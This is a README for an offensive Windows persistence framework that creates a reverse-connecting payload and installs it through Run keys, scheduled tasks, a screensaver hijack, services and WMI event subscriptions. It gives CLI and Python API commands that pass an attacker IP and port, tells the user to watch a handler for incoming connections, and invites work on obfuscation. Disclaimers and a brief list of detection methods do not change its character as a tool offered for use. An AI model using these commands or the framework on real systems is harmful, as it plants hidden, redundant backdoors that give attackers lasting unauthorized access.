# Master Windows Persistence Framework

**Comprehensive orchestration of multiple Windows persistence mechanisms**

⚠️ **WARNING**: Educational and authorized testing only. Unauthorized use is illegal.

## Overview

The Master Persistence Framework is a comprehensive tool that orchestrates multiple persistence mechanisms on Windows systems. It coordinates installation across registry keys, scheduled tasks, services, WMI events, and other techniques to ensure maximum reliability and redundancy.

## Features

✅ **7 Persistence Methods**
- Registry Run Keys (User & Machine)
- Scheduled Tasks (Logon & Periodic)
- Screensaver Hijacking
- Windows Services
- WMI Event Subscriptions

✅ **Intelligent Deployment**
- Automatically detects admin privileges
- Only attempts methods that are available
- Provides detailed success/failure feedback

✅ **Comprehensive Cleanup**
- Auto-generates removal scripts
- Tracks all installed methods
- Easy rollback capability

✅ **Testing Support**
- Testing instructions for each method
- Expected behavior documentation
- Test checklist generation

## Installation

```bash
# Install the package
pip install -e .

# Or run directly
python main.py --help
```

## Quick Start

### 1. Show Available Methods

```bash
python main.py --show-methods
```

### 2. Create Payload

```bash
python main.py --create-payload --attacker-ip 10.10.14.5 --attacker-port 4444
```

### 3. Install Comprehensive Persistence

```bash
python main.py --install C:\Windows\Temp\payload.ps1 --attacker-ip 10.10.14.5
```

### 4. Create and Install (One Step)

```bash
python main.py --create-and-install --attacker-ip 10.10.14.5 --attacker-port 4444
```

## File Structure

```
master_persistence/
├── __init__.py
├── main.py                        # CLI entry point
├── config.py                      # Configuration & constants
│
├── core/
│   ├── __init__.py
│   ├── utils.py                   # Shared utilities
│   ├── orchestrator.py            # Main coordinator
│   └── installer.py               # Method installer
│
└── output/
    ├── __init__.py
    ├── removal.py                 # Removal script generation
    └── tester.py                  # Testing instructions
```

## Persistence Methods

### 1. Registry Run Key (User)
- **Location**: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- **Trigger**: User logon
- **Admin Required**: No
- **Detection Difficulty**: Low

### 2. Registry Run Key (Machine)
- **Location**: `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- **Trigger**: User logon (system-wide)
- **Admin Required**: Yes
- **Detection Difficulty**: Low

### 3. Scheduled Task (Logon)
- **Trigger**: User logon
- **Admin Required**: No
- **Detection Difficulty**: Medium

### 4. Scheduled Task (Periodic)
- **Trigger**: Every 30 minutes
- **Admin Required**: No
- **Detection Difficulty**: Medium

### 5. Screensaver Hijack
- **Trigger**: Screensaver activation
- **Admin Required**: No
- **Detection Difficulty**: Medium

### 6. Windows Service
- **Trigger**: System startup
- **Admin Required**: Yes
- **Detection Difficulty**: Medium

### 7. WMI Event Subscription
- **Trigger**: Every 60 seconds or on event
- **Admin Required**: Yes
- **Detection Difficulty**: High

## Usage Examples

### Example 1: Basic Installation

```bash
# Create payload
python main.py --create-payload --attacker-ip 192.168.1.100

# Install persistence
python main.py --install C:\Temp\payload.ps1 --attacker-ip 192.168.1.100
```

### Example 2: Quick Installation

```bash
# Create and install in one command
python main.py --create-and-install --attacker-ip 192.168.1.100 --attacker-port 443
```

### Example 3: View Available Methods

```bash
# See what methods can be installed
python main.py --show-methods
```

## Python API Usage

```python
from master_persistence import MasterPersistence

# Create orchestrator
master = MasterPersistence()

# Create payload
payload_path = master.create_payload("10.10.14.5", 4444)

# Install comprehensive persistence
master.install_comprehensive_persistence(
    payload_path,
    "10.10.14.5",
    4444
)

# Display testing instructions
master.test_persistence()
```

## Removal

The framework automatically generates a removal script after installation:

```bash
# Run the generated removal script
remove_all_persistence_20250119_143022.bat
```

Manual removal commands are also provided for each method.

## Testing Persistence

After installation:

1. **Reboot the system** to test boot-triggered methods
2. **Log off/on** to test logon-triggered methods
3. **Wait for scheduled tasks** to trigger
4. **Monitor your handler** for incoming connections

Expected behaviors are documented for each method.

## Dependencies

Required modules (must be in same parent directory):
- `registry_persistence` - Registry-based persistence
- `scheduled_task_persistence` - Task scheduler methods
- `service_persistence` - Windows service methods (optional)
- `wmi_persistence` - WMI event methods (optional)

## Configuration

Edit `config.py` to customize:
- Default attacker IP/port
- Persistence method priorities
- Payload wrapper templates
- Output file naming

## Security Considerations

⚠️ **Important**:
- Methods have varying detection rates
- Multiple methods increase detection risk
- Use only in authorized environments
- Always clean up after testing
- Some methods require admin privileges

## Detection & Defense

Defenders can detect these methods by:
- Monitoring registry Run keys
- Auditing scheduled tasks
- Checking WMI subscriptions
- Reviewing installed services
- Using EDR/AV solutions

## Legal Notice

This tool is for **EDUCATIONAL PURPOSES ONLY**. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.

## Contributing

Contributions welcome! Areas for improvement:
- Additional persistence methods
- Better obfuscation techniques
- Enhanced removal capabilities
- More testing utilities

## License

MIT License - See LICENSE file for details

## Author

**Maxwell Cross** - 30 Days of Red Team Series
- GitHub: github.com/maxwellcross
- Blog: redteam.lab

## Changelog

### v1.0.0 (2025-01-19)
- Initial release
- 7 persistence methods
- Auto removal script generation
- Testing instructions
- Python API support

---

**Remember**: With great power comes great responsibility. Use ethically and legally.